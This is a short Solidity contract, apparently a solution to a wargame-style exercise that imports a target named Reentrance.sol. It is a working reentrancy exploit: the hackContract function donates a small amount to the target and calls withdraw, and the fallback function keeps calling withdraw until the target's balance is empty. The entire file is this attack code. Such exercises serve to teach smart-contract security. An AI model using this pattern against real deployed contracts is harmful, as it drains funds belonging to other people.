// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    Reentrance public hook; 
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        hook = Reentrance(_contractAddress);
    }

    function hackContract() external {
        // Code me!
        hook.donate{value: 4000000}(address(this));
        hook.withdraw();
    }

    fallback() external payable {
        if (address(contractAddress).balance != 0 ) {
            hook.withdraw(); 
        }
    }
}
